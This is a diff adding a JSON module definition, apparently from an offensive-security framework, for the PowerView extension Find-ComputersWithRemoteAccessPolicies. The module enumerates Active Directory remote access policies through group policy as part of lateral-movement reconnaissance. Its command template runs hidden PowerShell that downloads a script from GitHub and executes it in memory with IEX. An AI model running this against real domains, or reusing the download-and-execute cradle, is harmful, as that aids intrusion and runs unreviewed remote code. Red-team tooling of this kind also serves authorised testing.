@@ -1,0 +1,39 @@
+{
+  "base": {
+    "name": "Find-ComputersWithRemoteAccessPolicies",
+    "author": ["William Knowles (@william_knows)","Jon Cave (@joncave)"],
+    "path": ["windows", "x64", "powershell", "lateral", "gpo","Find-ComputersWithRemoteAccessPolicies.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "notes": "PowerView extensions for enumerating remote access policies through group policy. Blog Post: https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/",
+    "remote": "https://raw.githubusercontent.com/mwrlabs/gists/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1",
+    "local": ["data", "src", "mwrlabs", "gists", "Find-ComputersWithRemoteAccessPolicies.ps1"],
+    "options": [
+      {"name": "Domain", "value": "", "required": true, "flag":"-Domain", "description":"Specifies the domain to use for the query, defaults to the current domain."},
+      {"name": "SearchBase", "value": "", "required": false, "flag":"-SearchBase", "description":"The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries."},
+      {"name": "SearchScope", "value": "", "required": false, "flag":"-SearchScope", "description":"Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree)."},
+      {"name": "Server", "value": "", "required": false, "flag":"-Server", "description":"Specifies an Active Directory server (domain controller) to bind to."},
+      {"name": "ResultPageSize", "value": "", "required": false, "flag":"-ResultPageSize", "description":"Specifies the PageSize to set for the LDAP searcher object."},
+      {"name": "ServerTimeLimit", "value": "", "required": false, "flag":"-ServerTimeLimit", "description":"Specifies the maximum amount of time the server spends searching. Default of 120 seconds."},
+      {"name": "Credential", "value": "", "required": false, "flag":"-Credential", "description":"A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain."}
+    ],
+    "description": "",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mwrlabs/gists/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1');",
+      "Find-ComputersWithRemoteAccessPolicies",
+      "{{Domain}}",
+      "{{SearchBase}}",
+      "{{SearchScope}}",
+      "{{Server}}",
+      "{{ResultPageSize}}",
+      "{{ServerTimeLimit}}",
+      "{{Credential}}",
+      "\""
+    ]
+  }
+}
